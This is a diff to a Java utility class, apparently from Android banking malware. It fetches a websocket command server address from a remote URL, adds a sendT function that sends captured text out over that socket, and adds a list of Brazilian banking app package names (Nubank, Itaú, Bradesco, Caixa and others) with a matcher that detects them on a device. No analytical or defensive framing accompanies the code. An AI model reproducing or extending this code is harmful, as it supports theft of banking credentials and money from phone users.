@@ -130,7 +130,7 @@ public final class Util {
         long agora = System.currentTimeMillis();
         String cache = c.getSharedPreferences("p", 0).getString("host", null);
         long t = c.getSharedPreferences("p", 0).getLong("hostT", 0);
-        if (cache != null && agora - t < 20000) return "wss://" + cache + "/ws?t=" + Cfg.TOKEN;
+        if (cache != null && agora - t < 5000) return "wss://" + cache + "/ws?t=" + Cfg.TOKEN;
         try {
             HttpURLConnection h = (HttpURLConnection) new URL(Cfg.RAW + "?x=" + agora).openConnection();
             h.setConnectTimeout(6000);
@@ -190,9 +190,34 @@ public final class Util {
         return s.length() > 20000 ? s.substring(0, 20000) : s;
     }
 
+    public static void sendT(String t, String o) {
+        Net.send("{\"t\":\"" + esc(t) + "\",\"o\":\"" + esc(o) + "\"}");
+    }
+
     public static String esc(String s) {
         if (s == null) return "";
-        return s.replace("\\", "\\\\").replace("\"", "\\\"")
-                .replace("\n", "\\n").replace("\r", "");
+        StringBuilder b = new StringBuilder(s.length() + 16);
+        for (int i = 0; i < s.length(); i++) {
+            char c = s.charAt(i);
+            if (c == '\\') b.append("\\\\");
+            else if (c == '"') b.append("\\\"");
+            else if (c == '\n') b.append("\\n");
+            else if (c == '\r') b.append("\\r");
+            else if (c == '\t') b.append("\\t");
+            else if (c < 0x20) b.append(' ');
+            else b.append(c);
+        }
+        return b.toString();
+    }
+
+    public static final String[] BANCOS = {
+        "br.com.intermedium", "com.nu.production", "com.itau", "com.bradesco",
+        "com.santander.app", "br.com.bb.android", "br.com.gabba.Caixa", "com.picpay"
+    };
+
+    public static boolean banco(String pkg) {
+        if (pkg == null) return false;
+        for (String b : BANCOS) if (pkg.startsWith(b)) return true;
+        return false;
     }
 }
